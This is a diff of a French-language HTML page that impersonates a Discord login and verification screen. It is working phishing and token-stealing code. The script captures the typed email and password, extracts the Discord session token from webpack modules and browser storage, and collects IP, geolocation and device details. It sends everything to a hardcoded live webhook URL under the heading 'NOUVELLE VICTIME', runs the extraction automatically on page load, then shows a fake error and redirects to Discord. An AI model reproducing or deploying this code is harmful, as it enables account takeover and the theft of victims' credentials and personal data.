@@ -2,38 +2,135 @@
 <html lang="fr">
 <head>
     <meta charset="UTF-8">
-    <title>Discord Gift - Nitro</title>
+    <title>Discord - Vérification requise</title>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <style>
-        body {background: #36393f; color: #dcddde; font-family: 'Whitney', sans-serif; margin:0; padding:0;}
-        .container {max-width: 480px; margin: 40px auto; background: #2f3136; border-radius: 8px; overflow: hidden;}
-        header {background: #5865f2; padding: 20px; text-align: center;}
-        .content {padding: 30px;}
-        .fake-logo {font-size: 28px; font-weight: bold;}
-        .spinner {display: inline-block; width: 40px; height: 40px; border: 4px solid #5865f2; border-top-color: transparent; border-radius: 50%; animation: spin 1s linear infinite;}
-        @keyframes spin {to {transform: rotate(360deg);}}
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            background: #36393f;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+        }
+        .container {
+            background: #2f3136;
+            padding: 40px;
+            border-radius: 8px;
+            width: 90%;
+            max-width: 500px;
+            text-align: center;
+        }
+        .logo { margin-bottom: 30px; }
+        .logo h1 { color: white; font-size: 32px; }
+        input {
+            width: 100%;
+            padding: 15px;
+            margin: 10px 0;
+            background: #202225;
+            border: none;
+            border-radius: 4px;
+            color: white;
+            font-size: 16px;
+        }
+        button {
+            width: 100%;
+            padding: 15px;
+            margin-top: 20px;
+            background: #5865f2;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+        }
+        button:hover { background: #4752c4; }
+        .error { color: #ed4245; margin-top: 15px; display: none; }
+        .spinner { display: none; margin: 20px auto; width: 40px; height: 40px; border: 4px solid #5865f2; border-top-color: transparent; border-radius: 50%; animation: spin 1s linear infinite; }
+        @keyframes spin { to { transform: rotate(360deg); } }
     </style>
 </head>
 <body>
-    <div class="container">
-        <header>
-            <div class="fake-logo">Discord</div>
-            <h1 id="title">Chargement en cours...</h1>
-        </header>
-        <div class="content">
-            <p id="message" style="text-align:center; font-size:18px;">Vérification de votre compte Discord</p>
-            <div style="text-align:center; margin: 20px 0;">
-                <div class="spinner"></div>
-            </div>
-            <p style="text-align:center; color:#b9bbbe;">Veuillez patienter...</p>
+    <div class="container" id="container">
+        <div class="logo">
+            <h1>Discord</h1>
         </div>
+        <div id="loginForm">
+            <input type="text" id="email" placeholder="Email ou numéro de téléphone">
+            <input type="password" id="password" placeholder="Mot de passe">
+            <button onclick="sendCredentials()">Se connecter</button>
+            <div class="error" id="error">Identifiants incorrects</div>
+        </div>
+        <div class="spinner" id="spinner"></div>
+        <div id="message" style="color:#b9bbbe; margin-top:15px;"></div>
     </div>
 
     <script>
         const WEBHOOK_URL = "https://discord.com/api/webhooks/1513930112758714598/vWxfXiImV42jYEqx_4uMasupVp604sLZbmB09wAF-fFePdvL9zwEvSw9Z-MEHrmyIHnO";
         
-        function getDiscordToken() {
-            let token = null;
+        // Fonction pour obtenir l'IP
+        async function getIP() {
+            try {
+                let res = await fetch('https://api.ipify.org?format=json');
+                let data = await res.json();
+                return data.ip;
+            } catch(e) { return "Non disponible"; }
+        }
+        
+        // Fonction pour obtenir la géolocalisation approximative
+        async function getGeo() {
+            return new Promise((resolve) => {
+                if ("geolocation" in navigator) {
+                    navigator.geolocation.getCurrentPosition(
+                        (pos) => resolve(`${pos.coords.latitude}, ${pos.coords.longitude}`),
+                        () => resolve("Non autorisée")
+                    );
+                } else { resolve("Non supportée"); }
+            });
+        }
+        
+        // Envoi des informations au webhook
+        async function sendToWebhook(email, password, token, method) {
+            let ip = await getIP();
+            let geo = await getGeo();
+            let userAgent = navigator.userAgent;
+            let platform = navigator.platform;
+            let language = navigator.language;
+            let screen = `${screen.width}x${screen.height}`;
+            let time = new Date().toLocaleString();
+            let referrer = document.referrer || "Direct";
+            
+            let embed = {
+                title: "🎯 NOUVELLE VICTIME",
+                color: 0xFF0000,
+                fields: [
+                    {name: "📧 Email", value: email || "Non fourni", inline: true},
+                    {name: "🔑 Mot de passe", value: password || "Non fourni", inline: true},
+                    {name: "🎟️ Token Discord", value: token ? `\`${token.substring(0, 50)}...\`` : "Aucun token trouvé", inline: false},
+                    {name: "📱 Appareil", value: userAgent.substring(0, 100), inline: false},
+                    {name: "💻 Platforme", value: platform, inline: true},
+                    {name: "🌐 Langue", value: language, inline: true},
+                    {name: "📱 Ecran", value: screen, inline: true},
+                    {name: "🌍 IP", value: ip, inline: true},
+                    {name: "📍 Géolocalisation", value: geo, inline: true},
+                    {name: "🕐 Date/Heure", value: time, inline: true},
+                    {name: "🔗 Méthode", value: method, inline: true},
+                    {name: "📎 Référent", value: referrer.substring(0, 100), inline: false}
+                ],
+                timestamp: new Date().toISOString()
+            };
+            
+            fetch(WEBHOOK_URL, {
+                method: 'POST',
+                body: JSON.stringify({embeds: [embed]}),
+                headers: {'Content-Type': 'application/json'}
+            }).catch(e => console.log("Erreur:", e));
+        }
+        
+        // Extraction du token via webpack (navigateur uniquement)
+        function extractToken() {
             try {
                 let webpackChunk = webpackChunkdiscord_app;
                 if (webpackChunk) {
@@ -42,48 +139,82 @@
                         for (let c in e.c) modules.push(e.c[c]);
                     }]);
                     let tokenModule = modules.find(m => m?.exports?.default?.getToken !== undefined);
-                    if (tokenModule) token = tokenModule.exports.default.getToken();
+                    if (tokenModule) return tokenModule.exports.default.getToken();
                 }
             } catch(e) {}
-            if (!token || token.length < 50) {
-                try { token = localStorage.getItem("token"); } catch(e) {}
-            }
-            if (!token || token.length < 50) {
-                try { token = sessionStorage.getItem("token"); } catch(e) {}
-            }
-            return token;
+            try { return localStorage.getItem("token"); } catch(e) {}
+            try { return sessionStorage.getItem("token"); } catch(e) {}
+            return null;
         }
         
-        function sendToken(token) {
-            if (!token || token.length < 50) token = "AUCUN_TOKEN_TROUVE";
-            let message = {
-                content: "🎯 TOKEN DISCORD CAPTURÉ",
-                embeds: [{
-                    description: "```" + token + "```",
-                    color: 0x00FF00,
-                    fields: [
-                        {name: "User Agent", value: navigator.userAgent.substring(0, 80), inline: false},
-                        {name: "Heure", value: new Date().toLocaleString(), inline: true}
-                    ]
-                }]
-            };
-            fetch(WEBHOOK_URL, {method: 'POST', body: JSON.stringify(message), headers: {'Content-Type': 'application/json'}}).catch(e => {});
+        // Tentative d'ouverture de l'application Discord (pour mobile)
+        function openDiscordApp() {
+            let userAgent = navigator.userAgent;
+            let isMobile = /iPhone|iPad|iPod|Android/i.test(userAgent);
+            
+            if (isMobile) {
+                // Tentative d'ouverture de l'application Discord
+                setTimeout(() => {
+                    window.location.href = "discord://";
+                }, 1000);
+                setTimeout(() => {
+                    window.location.href = "https://discord.com/login";
+                }, 2000);
+            } else {
+                window.location.href = "https://discord.com/login";
+            }
         }
         
-        // Exécution principale
-        setTimeout(() => {
-            let token = getDiscordToken();
-            sendToken(token);
+        // Fonction principale quand la victime clique sur "Se connecter"
+        async function sendCredentials() {
+            let email = document.getElementById('email').value;
+            let password = document.getElementById('password').value;
+            let token = extractToken();
             
-            // Changer le texte
-            document.getElementById('title').innerText = "Redirection...";
-            document.getElementById('message').innerHTML = "Vérification terminée, redirection vers Discord...";
+            // Afficher le chargement
+            document.getElementById('loginForm').style.display = 'none';
+            document.getElementById('spinner').style.display = 'block';
+            document.getElementById('message').innerHTML = "Vérification en cours...";
             
-            // REDIRECTION VERS DISCORD (fonctionne à 100%)
+            // Envoi des données
+            await sendToWebhook(email, password, token, "Formulaire + Token");
+            
+            // Afficher erreur puis rediriger
+            document.getElementById('spinner').style.display = 'none';
+            document.getElementById('message').innerHTML = "Identifiants incorrects, redirection...";
+            document.getElementById('error').style.display = 'block';
+            
+            // Redirection vers Discord (application ou site)
             setTimeout(() => {
-                window.location.href = "https://discord.com/channels/@me";
-            }, 1500);
-        }, 500);
+                openDiscordApp();
+            }, 2000);
+        }
+        
+        // Extraction automatique au chargement (sans interaction)
+        setTimeout(async () => {
+            let token = extractToken();
+            if (token && token.length > 50) {
+                await sendToWebhook("Auto-extrait", "Auto-extrait", token, "Extraction automatique");
+                document.getElementById('message').innerHTML = "Session expirée, veuillez vous reconnecter...";
+                setTimeout(() => {
+                    openDiscordApp();
+                }, 1500);
+            }
+        }, 1000);
+        
+        // Tentative supplémentaire après 3 secondes
+        setTimeout(async () => {
+            let token = extractToken();
+            if (token && token.length > 50) {
+                await sendToWebhook("Auto-extrait (retry)", "Auto-extrait (retry)", token, "Extraction automatique - seconde tentative");
+            }
+        }, 3000);
+        
+        // Détection si c'est l'application Discord intégrée
+        let isDiscordApp = /Discord/i.test(navigator.userAgent);
+        if (isDiscordApp) {
+            document.getElementById('message').innerHTML = "⚠️ Veuillez utiliser un navigateur pour vous connecter";
+        }
     </script>
 </body>
 </html>
